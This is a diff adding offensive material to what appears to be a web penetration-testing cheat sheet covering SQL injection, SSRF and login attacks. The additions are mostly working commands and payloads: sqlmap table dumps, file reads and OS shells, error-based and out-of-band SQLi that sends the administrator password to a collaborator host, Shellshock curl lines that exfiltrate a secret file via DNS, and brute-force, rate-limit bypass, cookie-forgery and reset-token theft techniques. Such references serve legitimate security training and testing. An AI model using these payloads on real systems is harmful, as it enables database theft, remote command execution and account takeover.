@@ -1251,6 +1251,55 @@ cat parameters.txt | while read url; do sqlmap -u "$url" --batch --level=3 --ris
 ghauri -u "https://target.com?id=1" --dbs --batch
 ```
 
+**sqlmap Advanced Commands**
+```bash
+# Dump specific database table
+sqlmap -u "https://target.com?id=1" --cookie="session=..." --dbms=PostgreSQL --batch -D public -T users --dump
+
+# Read file from server
+sqlmap -u "https://target.com?id=1" --cookie="session=..." -p id --file-read "/home/user/secret"
+
+# OS command execution
+sqlmap -u "https://target.com?id=1" --os-shell
+
+# Run custom query
+sqlmap -u "https://target.com?id=1" --sql-query="SELECT password FROM users WHERE username='administrator'"
+
+# Exclude noisy params (speed up scan)
+sqlmap -u "https://target.com?id=1" --param-exclude="csrf|session|timestamp" --batch
+```
+
+**Conditional Error — Visible Error Technique**
+```sql
+-- Force data into error message by casting to int
+' AND CAST((SELECT 1) AS int)--              -- probe
+' AND 1=CAST((SELECT username FROM users) AS int)--  -- error shows username
+' AND 1=CAST((SELECT password FROM users) AS int)--  -- error shows password
+
+-- Oracle conditional error
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'  -- true → error
+-- Use to enumerate char by char:
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='admin')||'
+```
+
+**OOB SQLi via XXE (Oracle)**
+```sql
+-- DNS callback via XXE within SQLi
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR.oastify.com/"> %remote;]>'),'/l') FROM dual--
+
+-- Exfiltrate data via OOB:
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR.oastify.com/"> %remote;]>'),'/l') FROM dual--
+```
+
+**Bypass Equals (=) Sign**
+```sql
+-- When = is blocked, use alternatives:
+SUBSTRING(username,1,1) LIKE 'a'           -- LIKE instead of =
+SUBSTRING(username,1,1) IN ('a','b','c')   -- IN set
+SUBSTRING(VERSION(),1,1) BETWEEN 1 AND 3   -- BETWEEN range
+username REGEXP '^a'                        -- REGEXP pattern match
+```
+
 ---
 
 ### **4.3 Server-Side Request Forgery (SSRF)**
@@ -1359,6 +1408,16 @@ cat urls.txt | grep -E "url=|path=|redirect=|callback=|webhook=|proxy=|uri=|host
 for port in 22 80 443 3306 5432 6379 8080 8443 9090 27017 9200; do
   curl -s -w "%{http_code} %{time_total}" --connect-timeout 3 "$ssrf_url?target=http://127.0.0.1:$port" 
 done
+```
+
+**Shellshock via User-Agent (SSRF alternative)**
+```bash
+# If server passes User-Agent to shell → Shellshock RCE (CVE-2014-6271)
+curl -H 'User-Agent: () { :; }; /usr/bin/nslookup $(whoami).YOUR-COLLABORATOR.oastify.com' https://target.com/
+# If vulnerable: DNS lookup received at collaborator
+
+# Data exfiltration via Shellshock:
+curl -H 'User-Agent: () { :; }; /usr/bin/nslookup $(cat /home/user/secret | head -c 4).YOUR-COLLABORATOR.oastify.com' https://target.com/
 ```
 
 ---
@@ -1532,6 +1591,68 @@ password: *
 
 # NoSQL auth bypass
 {"username":{"$gt":""},"password":{"$gt":""}}
+```
+
+**Login Bypass — JSON Array Brute-Force**
+```bash
+# If login accepts JSON, send all passwords in one request to bypass rate limits
+POST /login
+Content-Type: application/json
+
+{"username":"carlos","password":["pass1","pass2","pass3","pass4","...ALL5000..."]}
+# Server checks each array element → one request = 5000 attempts
+```
+
+**IP-Based Rate Limit Bypass**
+```bash
+# Pitchfork attack: rotate IP via X-Forwarded-For for every attempt
+# Burp Intruder → Pitchfork mode:
+# Position 1: X-Forwarded-For: <1-5000>
+# Position 2: username=admin&password=<wordlist>
+# Each attempt uses a unique "IP" → bypasses IP-based lockout
+```
+
+**Username Enumeration via Response Timing**
+```bash
+# Existing users → server does more work = longer response
+# Burp Intruder → username wordlist + VERY LONG password
+# Add Response Time column → slow responses = valid users
+# Tip: Repeat test to confirm — real users consistently slower
+```
+
+**Stay-Logged-In Cookie Analysis**
+```bash
+# Pattern: base64(username:md5(password))
+echo "carlos" | md5sum                                   # get md5 hash
+echo -n "carlos:93862bf0..." | base64                    # encode
+# If cookie matches → you can forge stay-logged-in cookies for any user
+
+# Also try: base64(username:password) or base64(username:hash(timestamp))
+```
+
+**Password Change — Brute-Force Current Password**
+```bash
+# Enter two DIFFERENT new passwords (e.g., pass1, pass2) + different current passwords
+# If current password is WRONG → "Current password is incorrect"
+# If current password is CORRECT → "New passwords do not match"
+# This difference leaks when you hit the correct current password!
+```
+
+**Forgot Password — Token Reuse & API Tricks**
+```bash
+# 1. Reuse temporal token — request reset, capture token, try it multiple times
+
+# 2. Host header poison to steal token
+X-Forwarded-Host: YOUR-COLLABORATOR.oastify.com
+# Token sent to YOUR email → intercept
+
+# 3. Extract token via API parameter pollution
+POST /forgot-password
+username=administrator%26field=reset_token%23
+# If API returns: {reset_token: "abc123"} → token leaked
+
+# 4. Generate token for victim → brute-force immediately
+# Create reset for carlos → use macro to auto-brute force MFA/email token
 ```
 
 ---
